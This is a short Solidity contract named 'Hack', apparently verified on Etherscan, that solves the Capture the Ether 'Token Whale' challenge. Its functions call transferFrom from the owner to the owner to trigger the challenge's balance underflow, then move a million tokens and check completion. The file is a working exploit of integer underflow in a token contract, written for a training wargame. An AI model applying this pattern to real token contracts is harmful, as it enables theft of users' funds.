/**
 *Submitted for verification at Etherscan.io on 2022-04-17
*/

pragma solidity ^0.4.21;


interface TokenWhaleChallenge {
    function isComplete() external view returns (bool);
    function transfer(address to, uint256 value) external; 
    function transferFrom(address from, address to, uint256 value) external;
}

contract Hack {
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function Do(address addr) public payable{
        addr.transfer(address(this).balance);
    }

    function Do2(address addr, address own) public {
        TokenWhaleChallenge(addr).transferFrom(own, own, 1);
        TokenWhaleChallenge(addr).transfer(own, 1000000);
    }

    function Do3(address addr, address own) public {
        TokenWhaleChallenge(addr).transferFrom(own, own, 1);
        TokenWhaleChallenge(addr).transfer(own, 1000000);
        require(TokenWhaleChallenge(addr).isComplete());
    }

    function() public payable{
    }
}